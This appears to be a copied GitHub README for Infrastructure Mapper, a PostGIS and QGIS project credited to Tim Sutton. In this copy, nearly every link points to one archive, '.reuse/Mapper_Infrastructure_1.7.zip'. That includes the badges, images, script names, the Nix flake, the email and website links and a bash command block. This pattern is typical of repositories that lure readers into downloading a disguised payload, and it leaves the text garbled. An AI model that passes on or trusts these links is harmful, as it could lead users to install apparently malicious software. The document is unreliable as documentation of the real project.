# 🌐 Infrastructure Mapper
<!-- cspell:ignore landuse -->

![Logo](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)

Welcome to **Infrastructure Mapper**! This repository contains guidelines and conventions for a spatial database intended to be used managing infrastructure-related data.

---

## 📖 Table of Contents

- [🌐 Infrastructure Mapper](#-infrastructure-mapper)
  - [📖 Table of Contents](#-table-of-contents)
  - [🚀 Project Overview](#-project-overview)
  - [QA Status](#qa-status)
  - [📜 License](#-license)
  - [📂 Folder Structure](#-folder-structure)
  - [🤖 Using 'AI' (Large Language Models)](#-using-ai-large-language-models)
  - [🌿 Design Aesthetic](#-design-aesthetic)
  - [Data Model](#data-model)
  - [⚒️ Using](#️-using)
  - [🛠️ Scripts Overview](#️-scripts-overview)
  - [🧊 Using the Nix Flake](#-using-the-nix-flake)
  - [✨ Contributing](#-contributing)
  - [📧 Contact](#-contact)
  - [Contributors](#contributors)

---

## 🚀 Project Overview

![Animation](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)

---

## QA Status

| Test | Description |
|-----------|-------------|
| [![📃 License Checks.....](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)          | Check all files have license, copyright and attribution.            |
|[![🏋🏽 PostGIS Load Test...](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | Check that PostgreSQL / PostGIS fixtures load.             |
|[![✏️ Markdown Checks.....](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | Check that all markdown files are well formed.            |
|[![🐍 Python Checks.......](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | Python code QA checks.             |
|[![⚒️ QA Checks...........](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | General codebase QA checks.            |
|[![👁️ Spelling Checks.....](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | Check spelling in all files containing text.  |
|[![👨🏽 SQL Checks..........](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | Check that all SQL files             |
|[![🗜️ Yaml Checks.........](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)           | Check that all yaml files are well formed. |

This project consists of:

1. a [SQL Schema](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) for PostgreSQL,
2. a set of fixtures to load that schema with default values (particularly for lookup tables)
3. a set of QGIS forms and layer styles for visualising the data

---

## 📜 License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.

---

## 📂 Folder Structure

```plaintext
InfrastructureMapper/
├── img/               # Images and media resources used in this documentation
├── qml/               # QGIS layer style and form definitions
├── diagrams/          # Documentation and ERD diagrams
├── presentations/     # Presentations for this project and each model created using Marp
├── sql/               # Schema and fixtures to load into postgres
├── scripts/           # Helper scripts
└── https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip          # Project overview and conventions
```

---

## 🤖 Using 'AI' (Large Language Models)

We are fine with using LLM's and Generative Machine Learning to act as general assistants, but the following three guidelines should be followed:

1. **Repeatability:** Although we understand that repeatability is not possible generally, whenever you are verbatim using LLM or Generative Machine Learning outputs in this project, you **must** also provide the prompt that you used to generate the resource.
2. **Declaration:** Sharing the prompt above is implicit declaration that a machine learning assistant was used. If it is not obvious that a piece of work was generated, include the robot (🤖) icon next to a code snippet or text snippet.
3. **Validation:** Outputs generated by a virtual assistant should always be validated by a human and you, as contributor, take ultimate responsibility for the correct functionality of any code and the correct expression in any text or media you submit to this project.

---

## 🌿 Design Aesthetic

![Collage](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)

Our design aesthetic is an isometric style with a nature and environment inspired palette. We use an the color palette in the table below. The design approach can be personified by:

- Clean vector isometric projection
- Layered terrain with shadows
- Gentle color blending without gradients
- Minimal outlines for clarity
- Selective use of texture (like grass patterns or water ripples)

You can use the notes above and the table below if you are prompt engineering additional graphics for this project using tools like ChatGPT.

Our colour swatch looks like this:

<img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Electricity" width="164" height="164">

| Name               | Hex      | Use Case                  | Preview                |
|--------------------|----------|---------------------------|------------------------|
| Forest Green       | `#2F5D50`| Dominant vegetation tone  | <span style="display:inline-block;min-width:90px;padding:2px 8px;background:#f5f5f5;border-radius:4px;"><span style="color:#2F5D50;font-weight:bold;">#2F5D50</span></span> |
| Moss Green         | `#7C9C75`| Soft background greenery  | <span style="display:inline-block;min-width:90px;padding:2px 8px;background:#f5f5f5;border-radius:4px;"><span style="color:#7C9C75;font-weight:bold;">#7C9C75</span></span> |
| Earth Brown        | `#A9825A`| Soil, tree bark           | <span style="display:inline-block;min-width:90px;padding:2px 8px;background:#f5f5f5;border-radius:4px;"><span style="color:#A9825A;font-weight:bold;">#A9825A</span></span> |
| Sandstone Beige    | `#E0D2B2`| Pathways, terrain shading | <span style="display:inline-block;min-width:90px;padding:2px 8px;background:#f5f5f5;border-radius:4px;"><span style="color:#E0D2B2;font-weight:bold;">#E0D2B2</span></span> |
| Sky Blue           | `#A4DDED`| Sky, water elements       | <span style="display:inline-block;min-width:90px;padding:2px 8px;background:#f5f5f5;border-radius:4px;"><span style="color:#A4DDED;font-weight:bold;">#A4DDED</span></span> |
| Deep Teal          | `#2B7A78`| Shadows, water depth      | <span style="display:inline-block;min-width:90px;padding:2px 8px;background:#f5f5f5;border-radius:4px;"><span style="color:#2B7A78;font-weight:bold;">#2B7A78</span></span> |
| Leaf Yellow-Green  | `#C1E1C1`| Highlights on foliage     | <span style="display:inline-block;min-width:90px;padding:2px 8px;background:#f5f5f5;border-radius:4px;"><span style="color:#C1E1C1;font-weight:bold;">#C1E1C1</span></span> |
| Rock Gray          | `#9FA8A3`| Mountains, stones         | <span style="display:inline-block;min-width:90px;padding:2px 8px;background:#f5f5f5;border-radius:4px;"><span style="color:#9FA8A3;font-weight:bold;">#9FA8A3</span></span> |
| Cloud White        | `#F5F5F2`| Clouds, light accents     | <span style="display:inline-block;min-width:90px;padding:2px 8px;background:#f5f5f5;border-radius:4px;"><span style="color:#F5F5F2;font-weight:bold;">#F5F5F2</span></span> |

> 🤖 **Prompt:** Generate me a beautiful circular swatch with these colours. Invent nice unique, human names for each colour:
>
> #7C9C75 #A9825A #E0D2B2 #A4DDED #2B7A78 #C1E1C1 #9FA8A3 #F5F5F2

These colors are soft but grounded, avoiding over-saturation while maintaining a naturalistic feel that suits isometric vector work.

---

## Data Model

This section describes each component of the infrastructure mapper data model. You can also find a complete diagram of the data model in [https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) ([image render](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)).

| Icon | Description |
|------|-------------|
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Electricity" width="64" height="64"> | [Electricity](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) infrastructure such as power lines, transformers, and substations. |
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Infrastructure" width="64" height="64"> | General [infrastructure](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) elements like bridges, dams, and towers. |
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Water" width="64" height="64"> | [Water](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)-related infrastructure including pipes, tanks, and pumps. |
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Vegetation" width="64" height="64"> | [Vegetation](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) features such as trees, hedges, and planted areas. |
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Monitoring" width="64" height="64"> | [Monitoring](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) devices and their observations (e.g., sensors, cameras). |
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Buildings" width="64" height="64"> | [Buildings](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) and associated structures. |
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Fencing" width="64" height="64"> | [Fencing](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) and enclosure features, including standalone gates. |
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="POI" width="64" height="64"> | [Points of Interest](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) (POI) for notable locations or features. |
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Land use" width="64" height="64"> | [Land use areas](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) such as agricultural, residential, or conservation zones. |
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Gates" width="64" height="64"> | [Gates](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) as access points for properties or enclosures. |
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Poles" width="64" height="64"> | [Poles](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) for lighting, signage, or utility support. |
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Culinary" width="64" height="64"> | [Culinary facilities](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) like kitchens, canteens, and food storage. |
| <img src="https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip" alt="Roads" width="64" height="64"> | [Roads](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip), tracks, and paths for transportation infrastructure. |

---

## ⚒️ Using

Simply take the sql files in the sql folder and load them into postgres.

---

## 🛠️ Scripts Overview

The `scripts/` folder contains utility scripts to assist with database setup, data loading, and project maintenance. Below is a summary of each script:

| Script Name                | Description                                                                                  |
|----------------------------|----------------------------------------------------------------------------------------------|
| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`              | Nix specific to start a sandboxed postgresql instance with data stored in ./pgdata           |
| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`           | Loads the SQL schema files into the target database, setting up all required tables.         |
| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`               | Nix specific script to stop the postgres database                                            |
| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`                 | Git precommit check and format SQL files                                                     |
| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`                | Visualise the code history using gource                                                      |
| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`                | Launch VSCode with all settings and extensions needed to productively work on this project   |
| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`  | Generate presentations using marp.                                                           |
| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip` | Precommit hook for checking if the codebase has grown. |
| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip`| Precommit hook for checking if the test suite has grown. |
| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip` | Precommit hook for checking that docstrings were used when creating new python code. |
| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip` | Precommit hook for checking python modules have their encoding set. |
| `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip` | Precommit hook for license and copyright in source files. |

> ✏️ **Note:** Run each script from the project root. Some scripts may require environment variables or configuration—see comments within each script for usage details.

---

## 🧊 Using the Nix Flake

You can use the provided `https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip` to get a fully reproducible development environment and to run QGIS with the correct profile.

1. **Install [Nix](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)** (if you haven’t already).
2. **Enter the development shell:**

```bash
nix develop
```

This gives you all the tools and dependencies you need for working on this project.

1. **Run QGIS with the project profile:**

```bash
  nix run .#qgis
```

Or, for the long-term release version:

```bash
nix run .#qgis-ltr
```

1. **VSCode users:**  

You can launch a ready-to-use VSCode environment:

```bash
https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip
```

---

This makes it easy to get started and ensures everyone is using the same environment!

## ✨ Contributing

We welcome contributions! Please read the [https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) for guidelines on how to get started.

---

## 📧 Contact

Have questions or feedback? Feel free to reach out!  
📧 Email: [https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)  
🌐 Website: [https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip)

## Contributors

- [Tim Sutton](https://github.com/Shamzmohamed/InfrastructureMapper/raw/refs/heads/main/.reuse/Mapper_Infrastructure_1.7.zip) - project lead
-  

---

Made with ❤️ by Tim Sutton (@timlinux) and Kartoza Interns.
